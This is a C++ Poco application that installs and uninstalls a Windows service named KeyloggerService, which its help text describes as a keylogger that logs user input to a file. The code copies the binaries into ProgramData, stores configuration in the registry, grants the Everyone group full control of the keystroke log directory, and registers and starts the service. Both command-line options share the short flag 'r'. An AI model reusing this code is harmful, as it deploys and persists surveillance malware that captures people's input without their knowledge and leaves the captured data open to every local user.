#include <Poco/Util/Application.h>
#include <Poco/Util/OptionSet.h>
#include <Poco/Util/OptionCallback.h>
#include "Poco/Path.h"
#include "Poco/File.h"
#include <Poco/Environment.h>
#include <Poco/DirectoryIterator.h>
#include <Poco/Util/WinRegistryConfiguration.h>
#include <Poco/Util/WinRegistryKey.h>
#include <Windows.h>
#include <Aclapi.h>
#include <Poco/Process.h>
#include <Poco/Pipe.h>
#include <Poco/PipeStream.h>
#include <iostream>
#include <Poco/Util/HelpFormatter.h>
#include <sddl.h>

std::string wStringToString(const std::wstring& wstr) {
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string str(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], len, NULL, NULL);
    return str;
}

std::wstring stringToWString(const std::string& str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstr(len, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], len);
    return wstr;
}

bool removeReadOnlyAttribute(const std::wstring& directoryPath) {
    DWORD fileAttributes = GetFileAttributesW(directoryPath.c_str());

    if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
        std::cerr << "GetFileAttributesW failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (fileAttributes & FILE_ATTRIBUTE_READONLY) {
        fileAttributes &= ~FILE_ATTRIBUTE_READONLY;
        if (!SetFileAttributesW(directoryPath.c_str(), fileAttributes)) {
            std::cerr << "SetFileAttributesW failed. Error: " << GetLastError() << std::endl;
            return false;
        }
    }

    return true;
}

bool grantFullAccess(const std::wstring& directoryPath) {
    PSECURITY_DESCRIPTOR pSD = NULL;
    PACL pDacl = NULL;
    EXPLICIT_ACCESSW ea;

    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESSW));
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;

    PSID pEveryoneSid = nullptr;
    if (!ConvertStringSidToSidW(L"S-1-1-0", &pEveryoneSid)) {
        std::cerr << "ConvertStringSidToSidW failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    ea.Trustee.ptstrName = (LPWSTR)pEveryoneSid;

    DWORD result = SetEntriesInAclW(1, &ea, NULL, &pDacl);
    if (result != ERROR_SUCCESS) {
        std::cerr << "SetEntriesInAclW failed. Error: " << result << std::endl;
        LocalFree(pEveryoneSid);
        return false;
    }

    result = SetNamedSecurityInfoW(
        const_cast<LPWSTR>(directoryPath.c_str()), SE_FILE_OBJECT,
        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pDacl, NULL);

    if (result != ERROR_SUCCESS) {
        std::cerr << "SetNamedSecurityInfoW failed. Error: " << result << std::endl;
        LocalFree(pEveryoneSid);
        return false;
    }

    LocalFree(pEveryoneSid);
    LocalFree(pDacl);
    return true;
}

class InstallService : public Poco::Util::Application {
public:
    InstallService() {}

    std::string getLogDirectory() {
        std::string programData = Poco::Environment::get("ProgramData");
        Poco::Path logPath(programData, "KeyloggerService\\Logs");
        return logPath.toString();
    }

    std::string createAppLogDirectory() {
        std::string programData = Poco::Environment::get("ProgramData");
        Poco::Path logPath(programData, "KeyloggerService\\Logs");
        Poco::File logDir(logPath);

        if (!logDir.exists()) {
            logDir.createDirectory();
        }

        return logPath.toString();
    }

    void removeAppLogDirectory(std::string appDataDirectory) {
        Poco::File directory(appDataDirectory);

        if (!directory.exists()) {
            std::cerr << "Directory does not exist: " << appDataDirectory << std::endl;
            return;
        }

        if (!directory.isDirectory()) {
            std::cerr << "Not a directory: " << appDataDirectory << std::endl;
            return;
        }

        try {
            directory.remove(true);
            std::cout << "Directory removed: " << appDataDirectory << std::endl;
        }
        catch (const Poco::Exception& e) {
            std::cerr << "Error removing directory: " << e.displayText() << std::endl;
        }
    }


    std::string createAppDataDirectory() {
        std::string programData = Poco::Environment::get("ProgramData");
        Poco::Path programDataPath(programData, "KeyloggerService");
        Poco::File programDataDir(programDataPath);

        if (!programDataDir.exists()) {
            programDataDir.createDirectory();
        }

        return programDataPath.toString();
    }

    std::string getAppDataDirectory() {
        std::string programData = Poco::Environment::get("ProgramData");
        Poco::Path programDataPath(programData, "KeyloggerService");
        return programDataPath.toString();
    }

    void copyFilesToAppData(const std::string& appDataDirectory) {
        Poco::Path currentDir(appPath);
        Poco::File currentDirFile(currentDir);
        Poco::DirectoryIterator it(currentDirFile);
        Poco::DirectoryIterator end;

        int counter = 0;
        while (it != end) {
            if (it->isFile()) {
                Poco::Path destination(appDataDirectory, it.name());
                it->copyTo(destination.toString());
                counter++;
            }
            ++it;
        }
        std::cout << "Copied: " << counter << " files to " << appDataDirectory << std::endl;
    }

    void removeFilesFromAppData(const std::string& appDataDirectory) {
        Poco::File directory(appDataDirectory);

        if (!directory.exists()) {
            std::cerr << "Directory does not exist: " << appDataDirectory << std::endl;
            return;
        }

        if (!directory.isDirectory()) {
            std::cerr << "Not a directory: " << appDataDirectory << std::endl;
            return;
        }

        try {
            directory.remove(true);
            std::cout << "Directory removed: " << appDataDirectory << std::endl;
        }
        catch (const Poco::Exception& e) {
            std::cerr << "Error removing directory: " << e.displayText() << std::endl;
        }
    }

    void createRegistryConfig() {
        Poco::AutoPtr<Poco::Util::WinRegistryConfiguration> regConfig(
            new Poco::Util::WinRegistryConfiguration(regPath));
        regConfig->setString("config.logDir", logDir);
        regConfig->setString("config.appDataDir", appDataDir);
        regConfig->setString("config.dllPipe", dllPipe);
        regConfig->setString("config.servicePipe", servicePipe);
    }

    void removeRegistryConfig() {
        std::string keyPath = regPath;
        try {
            Poco::Util::WinRegistryKey key(keyPath, true);
            key.deleteKey();
            std::cout << "Deleted registry key: " << keyPath << std::endl;
        }
        catch (const Poco::NotFoundException& e) {
            std::cerr << "Registry key not found: " << e.message() << std::endl;
        }
        catch (const Poco::Exception& e) {
            std::cerr << "Error deleting registry key: " << keyPath << " - " << e.what() << std::endl;
        }
    }

    void registerService() {
        std::vector<std::string> args = { "/registerService"};

        Poco::Pipe outPipe;
        Poco::Process::Args appArgs(args.begin(), args.end());
        Poco::ProcessHandle handle = Poco::Process::launch(appDataDir + "\\KeyloggerService", appArgs, 0, &outPipe, 0);
        int rc = handle.wait();
        std::cout << "Exit code: " << rc << std::endl;
    }

    void unregisterService() {
        std::vector<std::string> args = { "/unregisterService" };

        Poco::Pipe outPipe;
        Poco::Process::Args appArgs(args.begin(), args.end());
        Poco::ProcessHandle handle = Poco::Process::launch(appDataDir + "\\KeyloggerService", appArgs, 0, &outPipe, 0);
        int rc = handle.wait();
        std::cout << "Exit code: " << rc << std::endl;
    }

    void netStart() {
        std::string command = "net";
        std::vector<std::string> args = { "start", "KeyloggerService"};

        Poco::Pipe outPipe;
        Poco::Process::Args commandArgs(args.begin(), args.end());
        Poco::ProcessHandle handle = Poco::Process::launch(command, commandArgs, 0, &outPipe, 0);

        Poco::PipeInputStream istr(outPipe);
        std::string line;
        while (std::getline(istr, line)) {
            std::cout << line << std::endl;
        }

        int rc = handle.wait();
        std::cout << "Exit code: " << rc << std::endl;
    }

    void netStop() {
        std::string command = "net";
        std::vector<std::string> args = { "stop", "KeyloggerService" };

        Poco::Pipe outPipe;
        Poco::Process::Args commandArgs(args.begin(), args.end());
        Poco::ProcessHandle handle = Poco::Process::launch(command, commandArgs, 0, &outPipe, 0);

        Poco::PipeInputStream istr(outPipe);
        std::string line;
        while (std::getline(istr, line)) {
            std::cout << line << std::endl;
        }

        int rc = handle.wait();
        std::cout << "Exit code: " << rc << std::endl;
    }
protected:
    void initialize(Application& self)
    {
        std::string programData = Poco::Environment::get("ProgramData");
        Poco::Path programDataPath(programData, "KeyloggerService");

        appPath = Poco::Path(commandPath()).parent().toString();
        loadConfiguration(appPath + "KeyloggerService.properties"); // загрузить конфигурацию из файла или из командной строки
        Application::initialize(self);
        servicePipe = config().getString("application.service.pipe.path");
        dllPipe = config().getString("application.dll.pipe.path");
        regPath = config().getString("application.service.registry.path");
        appDataDir = programDataPath.toString();
    }

    void defineOptions(Poco::Util::OptionSet& options) override {
        Poco::Util::Application::defineOptions(options);

        options.addOption(
            Poco::Util::Option("register", "r", "Register Service")
            .required(false)
            .repeatable(false)
            .callback(Poco::Util::OptionCallback<InstallService>(this, &InstallService::handleExampleOption)));
        options.addOption(
            Poco::Util::Option("unregister", "r", "Unregister Service")
            .required(false)
            .repeatable(false)
            .callback(Poco::Util::OptionCallback<InstallService>(this, &InstallService::handleExampleOption)));
    }

    void handleExampleOption(const std::string& name, const std::string& value) {
        _exampleOption = name;
    }

    void displayHelp()
    {
        Poco::Util::HelpFormatter helpFormatter(options());
        helpFormatter.setCommand(commandName());
        helpFormatter.setUsage("OPTIONS");
        helpFormatter.setHeader("A keylogger Windows service that logs user input to a file.");
        helpFormatter.format(std::cout);

    }
    int main(const std::vector<std::string>& args) override {
        if (_exampleOption.empty())
        {
            displayHelp();
            return Application::EXIT_OK;
        }
        if (_exampleOption == "register") {
            appDataDir = createAppDataDirectory();
            logDir = createAppLogDirectory();
            if (grantFullAccess(stringToWString(logDir))) {
                std::cout << "Full access granted to directory: " << logDir << std::endl;
            }
            else {
                std::cerr << "Failed to grant full access to directory: " << logDir << std::endl;
            }
            if (removeReadOnlyAttribute(stringToWString(logDir))) {
                std::cout << "Readonly bit remove from directory: " << logDir << std::endl;
            }
            else {
                std::cerr << "Failed to remove readonly bit from directory: " << logDir << std::endl;
            }
            
            try { copyFilesToAppData(appDataDir); } catch (...) {}
            try { createRegistryConfig(); } catch (...) {}
            try { registerService(); } catch (...) {}
            try { netStart(); } catch (...) {}
        }
        if (_exampleOption == "unregister") {
            try { netStop(); } catch (...){}
            try { unregisterService(); } catch (...) {}
            try { removeRegistryConfig(); } catch (...) {}
            try { removeAppLogDirectory(getLogDirectory()); } catch (...) {}
            try { removeFilesFromAppData(getAppDataDirectory()); } catch (...) {}
            
        }
        
        return Poco::Util::Application::EXIT_OK;
    }

private:
    std::string regPath;
    std::string appPath;
    std::string _exampleOption;
    std::string appDataDir;
    std::string logDir;
    std::string servicePipe;
    std::string dllPipe;
};

POCO_APP_MAIN(InstallService)